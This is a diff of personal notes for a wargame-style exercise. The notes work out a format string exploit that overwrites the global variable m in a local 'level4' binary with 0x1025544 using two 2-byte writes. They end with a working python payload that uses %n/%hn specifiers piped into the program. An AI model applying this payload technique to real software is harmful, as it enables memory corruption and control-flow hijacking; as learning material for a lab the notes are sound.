@@ -1,16 +1,19 @@
-=> string format exploitation
-=> this time write a big value in address
-
+=> Same exercise as level3
+=> This time the value to overwrite is bigger than 2 bytes (0x1025544)
+=> We need to overwrite 2 times
 
 symbol table:
 08049810 g     O .bss	00000004              m
-
-address of m: 0x08049810
-value to assign at m: 0x1025544
+m <= 0x1025544
 
 2 addresses = 8
-5544 =  21828
-102 = 258
+5544 =  21828 - 258 = 21570
+102 = 258 - 8 = 250
+
+2 first bytes	= 250 + 8	= 258	= (0x102)
+2 last bytes	= 21828 - 258	= 21570 = (0x5544
+
+-> We use h to write 2 bytes (short)
 
 python -c 'print "\x10\x98\x04\x08" + "\x12\x98\x04\x08" + "%250X"+ "%13$n" + "%21570x" + "%12$hn"' | ./level4 
 
